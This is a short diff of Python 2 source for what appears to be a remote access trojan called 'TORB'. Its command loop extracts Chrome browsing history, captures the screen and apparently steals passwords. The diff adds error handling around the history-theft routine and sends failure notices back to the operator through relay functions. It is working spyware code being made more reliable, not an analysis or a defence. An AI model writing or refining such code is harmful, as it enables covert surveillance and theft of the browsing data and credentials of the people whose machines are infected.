@@ -184,9 +184,14 @@ def main():
 				q = z
 			# Extract Chrome Browser History
 			elif z == "history":
-				EPE_Main()
-				chromeFug()
-				analyze(sites_count_sorted)
+				print "Extracting Chrome History..."
+				try:
+					EPE_Main()
+					chromeFug()
+					analyze(sites_count_sorted)
+				except:
+					print "History Extraction Failed."
+					relayMe("TORB was unable to extract history. Possible UAC restriction.")
 				q = z
 			elif z == "screengrab":
 				print "Capturing Screen"
@@ -294,9 +299,14 @@ def main():
 					comm_backup("TORB was unable to extract passwords. Possible UAC restriction.")
 				q = z
 			elif z == "history":
-				EPE_Main()
-				chromeFug()
-				analyze(sites_count_sorted)
+				print "Extracting Chrome History"
+				try:
+					EPE_Main()
+					chromeFug()
+					analyze(sites_count_sorted)
+				except:
+					print "History Extraction Failed."
+					comm_backup("TORB was unable to extract history. Possible UAC restriction.")
 				q = z
 			elif z == "screengrab":
 				print "Capturing Screen"
